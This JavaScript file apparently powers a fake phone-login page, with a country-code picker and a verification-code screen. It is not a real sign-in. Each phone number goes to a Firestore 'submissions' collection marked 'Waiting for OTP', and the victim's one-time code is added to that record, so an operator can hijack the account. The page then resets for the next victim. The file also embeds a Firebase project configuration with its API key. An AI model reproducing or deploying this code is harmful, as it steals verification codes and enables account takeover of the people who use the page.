import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  query,
  orderBy,
  limit,
  getDocs,
  updateDoc,
  doc
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDpZxduOiWNanY82r1fFJ-kosZTKZosx4E",
  authDomain: "register-12a60.firebaseapp.com",
  projectId: "register-12a60",
  storageBucket: "register-12a60.firebasestorage.app",
  messagingSenderId: "172443565306",
  appId: "1:172443565306:web:93ff965da73158f0521d43",
  measurementId: "G-46MXF2FC8Q"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);


document.addEventListener("DOMContentLoaded", () => {

const countries = [

{name:"Afghanistan",code:"+93",flag:"af"},
{name:"Bangladesh",code:"+880",flag:"bd"},
{name:"Belgium",code:"+32",flag:"be"},
{name:"Brazil",code:"+55",flag:"br"},
{name:"Canada",code:"+1",flag:"ca"},
{name:"China",code:"+86",flag:"cn"},
{name:"Egypt",code:"+20",flag:"eg"},
{name:"France",code:"+33",flag:"fr"},
{name:"Germany",code:"+49",flag:"de"},
{name:"Ghana",code:"+233",flag:"gh"},
{name:"India",code:"+91",flag:"in"},
{name:"Italy",code:"+39",flag:"it"},
{name:"Japan",code:"+81",flag:"jp"},
{name:"Kenya",code:"+254",flag:"ke"},
{name:"Mexico",code:"+52",flag:"mx"},
{name:"Morocco",code:"+212",flag:"ma"},
{name:"Netherlands",code:"+31",flag:"nl"},
{name:"New Zealand",code:"+64",flag:"nz"},
{name:"Nigeria",code:"+234",flag:"ng"},
{name:"Norway",code:"+47",flag:"no"},
{name:"Pakistan",code:"+92",flag:"pk"},
{name:"Portugal",code:"+351",flag:"pt"},
{name:"Russia",code:"+7",flag:"ru"},
{name:"Saudi Arabia",code:"+966",flag:"sa"},
{name:"Singapore",code:"+65",flag:"sg"},
{name:"South Africa",code:"+27",flag:"za"},
{name:"South Korea",code:"+82",flag:"kr"},
{name:"Spain",code:"+34",flag:"es"},
{name:"Sweden",code:"+46",flag:"se"},
{name:"Switzerland",code:"+41",flag:"ch"},
{name:"Turkey",code:"+90",flag:"tr"},
{name:"Uganda",code:"+256",flag:"ug"},
{name:"Ukraine",code:"+380",flag:"ua"},
{name:"United Arab Emirates",code:"+971",flag:"ae"},
{name:"United Kingdom",code:"+44",flag:"gb"},
{name:"United States",code:"+1",flag:"us"},
{name:"Vietnam",code:"+84",flag:"vn"},
{name:"Zambia",code:"+260",flag:"zm"},
{name:"Zimbabwe",code:"+263",flag:"zw"},
{name:"Azerbaijan",code:"+994",flag:"az"},
{name:"Bahamas",code:"+1",flag:"bs"},
{name:"Bahrain",code:"+973",flag:"bh"},
{name:"Barbados",code:"+1",flag:"bb"},
{name:"Belarus",code:"+375",flag:"by"},
{name:"Belize",code:"+501",flag:"bz"},
{name:"Benin",code:"+229",flag:"bj"},
{name:"Bhutan",code:"+975",flag:"bt"},
{name:"Bolivia",code:"+591",flag:"bo"},
{name:"Bosnia and Herzegovina",code:"+387",flag:"ba"},
{name:"Botswana",code:"+267",flag:"bw"},
{name:"Brunei",code:"+673",flag:"bn"},
{name:"Bulgaria",code:"+359",flag:"bg"},
{name:"Burkina Faso",code:"+226",flag:"bf"},
{name:"Burundi",code:"+257",flag:"bi"},
{name:"Cambodia",code:"+855",flag:"kh"},
{name:"Cameroon",code:"+237",flag:"cm"},
{name:"Cape Verde",code:"+238",flag:"cv"},
{name:"Central African Republic",code:"+236",flag:"cf"},
{name:"Chad",code:"+235",flag:"td"},
{name:"Chile",code:"+56",flag:"cl"},
{name:"Colombia",code:"+57",flag:"co"},
{name:"Comoros",code:"+269",flag:"km"},
{name:"Congo",code:"+242",flag:"cg"},
{name:"Costa Rica",code:"+506",flag:"cr"},
{name:"Croatia",code:"+385",flag:"hr"},
{name:"Cuba",code:"+53",flag:"cu"},
{name:"Cyprus",code:"+357",flag:"cy"},
{name:"Czech Republic",code:"+420",flag:"cz"},
{name:"Denmark",code:"+45",flag:"dk"},
{name:"Djibouti",code:"+253",flag:"dj"},
{name:"Dominica",code:"+1",flag:"dm"},
{name:"Dominican Republic",code:"+1",flag:"do"},
{name:"Ecuador",code:"+593",flag:"ec"},
{name:"El Salvador",code:"+503",flag:"sv"},
{name:"Equatorial Guinea",code:"+240",flag:"gq"},
{name:"Eritrea",code:"+291",flag:"er"},
{name:"Estonia",code:"+372",flag:"ee"},
{name:"Eswatini",code:"+268",flag:"sz"},
{name:"Ethiopia",code:"+251",flag:"et"},
{name:"Fiji",code:"+679",flag:"fj"},
{name:"Finland",code:"+358",flag:"fi"},
{name:"Gabon",code:"+241",flag:"ga"},
{name:"Gambia",code:"+220",flag:"gm"},
{name:"Georgia",code:"+995",flag:"ge"},
{name:"Greece",code:"+30",flag:"gr"},
{name:"Grenada",code:"+1",flag:"gd"},
{name:"Guatemala",code:"+502",flag:"gt"},
{name:"Guinea",code:"+224",flag:"gn"},
{name:"Guinea-Bissau",code:"+245",flag:"gw"},
{name:"Guyana",code:"+592",flag:"gy"},
{name:"Haiti",code:"+509",flag:"ht"},
{name:"Honduras",code:"+504",flag:"hn"},
{name:"Hungary",code:"+36",flag:"hu"},
{name:"Iceland",code:"+354",flag:"is"},
{name:"Indonesia",code:"+62",flag:"id"},
{name:"Iran",code:"+98",flag:"ir"},
{name:"Iraq",code:"+964",flag:"iq"},
{name:"Ireland",code:"+353",flag:"ie"},
{name:"Israel",code:"+972",flag:"il"},
{name:"Jamaica",code:"+1",flag:"jm"},
{name:"Jordan",code:"+962",flag:"jo"},
{name:"Kazakhstan",code:"+7",flag:"kz"},
{name:"Kuwait",code:"+965",flag:"kw"},
{name:"Kyrgyzstan",code:"+996",flag:"kg"},
{name:"Laos",code:"+856",flag:"la"},
{name:"Latvia",code:"+371",flag:"lv"},
{name:"Lebanon",code:"+961",flag:"lb"},
{name:"Lesotho",code:"+266",flag:"ls"},
{name:"Liberia",code:"+231",flag:"lr"},
{name:"Libya",code:"+218",flag:"ly"},
{name:"Liechtenstein",code:"+423",flag:"li"},
{name:"Lithuania",code:"+370",flag:"lt"},
{name:"Luxembourg",code:"+352",flag:"lu"},
{name:"Madagascar",code:"+261",flag:"mg"},
{name:"Malawi",code:"+265",flag:"mw"},
{name:"Malaysia",code:"+60",flag:"my"},
{name:"Maldives",code:"+960",flag:"mv"},
{name:"Mali",code:"+223",flag:"ml"},
{name:"Malta",code:"+356",flag:"mt"},
{name:"Mauritania",code:"+222",flag:"mr"},
{name:"Mauritius",code:"+230",flag:"mu"},
{name:"Moldova",code:"+373",flag:"md"},
{name:"Monaco",code:"+377",flag:"mc"},
{name:"Mongolia",code:"+976",flag:"mn"},
{name:"Montenegro",code:"+382",flag:"me"},
{name:"Mozambique",code:"+258",flag:"mz"},
{name:"Myanmar",code:"+95",flag:"mm"},
{name:"Namibia",code:"+264",flag:"na"},
{name:"Nepal",code:"+977",flag:"np"},
{name:"Nicaragua",code:"+505",flag:"ni"},
{name:"Niger",code:"+227",flag:"ne"},
{name:"North Macedonia",code:"+389",flag:"mk"},
{name:"Oman",code:"+968",flag:"om"},
{name:"Panama",code:"+507",flag:"pa"},
{name:"Papua New Guinea",code:"+675",flag:"pg"},
{name:"Paraguay",code:"+595",flag:"py"},
{name:"Peru",code:"+51",flag:"pe"},
{name:"Philippines",code:"+63",flag:"ph"},
{name:"Poland",code:"+48",flag:"pl"},
{name:"Qatar",code:"+974",flag:"qa"},
{name:"Romania",code:"+40",flag:"ro"},
{name:"Rwanda",code:"+250",flag:"rw"},
{name:"Senegal",code:"+221",flag:"sn"},
{name:"Serbia",code:"+381",flag:"rs"},
{name:"Sierra Leone",code:"+232",flag:"sl"},
{name:"Slovakia",code:"+421",flag:"sk"},
{name:"Slovenia",code:"+386",flag:"si"},
{name:"Somalia",code:"+252",flag:"so"},
{name:"South Sudan",code:"+211",flag:"ss"},
{name:"Sri Lanka",code:"+94",flag:"lk"},
{name:"Sudan",code:"+249",flag:"sd"},
{name:"Suriname",code:"+597",flag:"sr"},
{name:"Syria",code:"+963",flag:"sy"},
{name:"Taiwan",code:"+886",flag:"tw"},
{name:"Tajikistan",code:"+992",flag:"tj"},
{name:"Tanzania",code:"+255",flag:"tz"},
{name:"Thailand",code:"+66",flag:"th"},
{name:"Togo",code:"+228",flag:"tg"},
{name:"Trinidad and Tobago",code:"+1",flag:"tt"},
{name:"Tunisia",code:"+216",flag:"tn"},
{name:"Turkmenistan",code:"+993",flag:"tm"},
{name:"Uruguay",code:"+598",flag:"uy"},
{name:"Uzbekistan",code:"+998",flag:"uz"},
{name:"Venezuela",code:"+58",flag:"ve"},
{name:"Yemen",code:"+967",flag:"ye"}
];

countries.sort((a, b) => a.name.localeCompare(b.name));

const selectedCountry=document.getElementById("selectedCountry");
const popup=document.getElementById("countryPopup");
const list=document.getElementById("countryList");
const search=document.getElementById("countrySearch");

const selectedFlag=document.getElementById("selectedFlag");
const selectedName=document.getElementById("selectedName");
const selectedCode=document.getElementById("selectedCode");

const overlay=document.getElementById("countryOverlay");

overlay.addEventListener("click",()=>{

popup.classList.remove("active");

overlay.classList.remove("active");

});

function renderCountries(data){

list.innerHTML="";

data.forEach(country=>{

const item=document.createElement("div");

item.className="country-item";

item.innerHTML=`
<img src="https://flagcdn.com/w40/${country.flag}.png">
<span>${country.name}</span>
<span class="code">${country.code}</span>
`;

item.addEventListener("click",()=>{

selectedFlag.src=`https://flagcdn.com/w40/${country.flag}.png`;

selectedName.textContent=country.name;

selectedCode.textContent=country.code;

popup.classList.remove("active");
overlay.classList.remove("active");

search.value="";

renderCountries(countries);

});

list.appendChild(item);

});

}

renderCountries(countries);

selectedCountry.addEventListener("click",()=>{

popup.classList.add("active");
overlay.classList.add("active");

search.focus();

});

search.addEventListener("input",()=>{

const value=search.value.toLowerCase();

renderCountries(

countries.filter(country=>

country.name.toLowerCase().includes(value)

)

);

});

document.addEventListener("click",(e)=>{

if(!e.target.closest(".country-picker")){

popup.classList.remove("active");
overlay.classList.remove("active");

}

});

const nextBtn = document.getElementById("nextBtn");

const loginPage = document.getElementById("loginPage");

const verifyPage = document.getElementById("verifyPage");

const phoneNumber = document.getElementById("phoneNumber");

const verifyPhone = document.getElementById("verifyPhone");

nextBtn.addEventListener("click", async () => {

    otpSubmitted = false;

    let phone = phoneNumber.value.trim();

    if (phone === "") {
        phoneNumber.focus();
        return;
    }

    // Remove the first 0 if present
    if (phone.startsWith("0")) {
        phone = phone.substring(1);
    }

    verifyPhone.textContent =
`${selectedCode.textContent}${phone}`;

try {

  const docRef = await addDoc(collection(db, "submissions"), {
    phone: `${selectedCode.textContent}${phone}`,
    otp: "",
    status: "Waiting for OTP",
    createdAt: serverTimestamp()
  });

  console.log("Saved successfully:", docRef.id);

} catch (error) {

  console.error("Firestore Error:", error);

}

loginPage.style.display = "none";

verifyPage.style.display = "flex";

});

const wrongNumber = document.getElementById("wrongNumber");

wrongNumber.addEventListener("click", (e) => {

    e.preventDefault();

    verifyPage.style.display = "none";

    loginPage.style.display = "flex";

    phoneNumber.focus();

});

const otpInputs = document.querySelectorAll(".otp");

otpInputs.forEach((input, index) => {

    input.addEventListener("input", () => {

        input.value = input.value.replace(/\D/g, "");

        if (input.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }

        submitOTP();

    });

    input.addEventListener("keydown", (e) => {

        if (e.key === "Backspace" && !input.value && index > 0) {
            otpInputs[index - 1].focus();
        }

    });

    input.addEventListener("paste", (e) => {

        e.preventDefault();

        const code = (e.clipboardData || window.clipboardData)
            .getData("text")
            .replace(/\D/g, "")
            .slice(0, otpInputs.length);

        code.split("").forEach((digit, i) => {
            otpInputs[i].value = digit;
        });

        if (code.length === otpInputs.length) {
            otpInputs[otpInputs.length - 1].focus();
        } else {
            otpInputs[code.length].focus();
        }

        submitOTP();

    });

});

});

const otpInputs = document.querySelectorAll(".otp");

let otpSubmitted = false;

async function submitOTP() {

    if (otpSubmitted) return;

    const otp = [...otpInputs].map(input => input.value).join("");

    if (otp.length !== otpInputs.length) return;

    otpSubmitted = true;

    try {

        const q = query(
            collection(db, "submissions"),
            orderBy("createdAt", "desc"),
            limit(1)
        );

        const snap = await getDocs(q);

        if (!snap.empty) {

            const docId = snap.docs[0].id;

         await updateDoc(doc(db, "submissions", docId), {

    otp: otp,
    status: "OTP Submitted"

});

console.log("OTP sent instantly");

// Clear all OTP boxes
otpInputs.forEach(input => {
    input.value = "";
});

// Return to phone number page
verifyPage.style.display = "none";
loginPage.style.display = "flex";

// Clear phone number
phoneNumber.value = "";

// Clear displayed number
verifyPhone.textContent = "";

// Focus phone number input
phoneNumber.focus();

// Allow next OTP submission
otpSubmitted = false;

            console.log("OTP sent instantly");

        }

    } catch (err) {

        console.error(err);
        otpSubmitted = false;

    }

}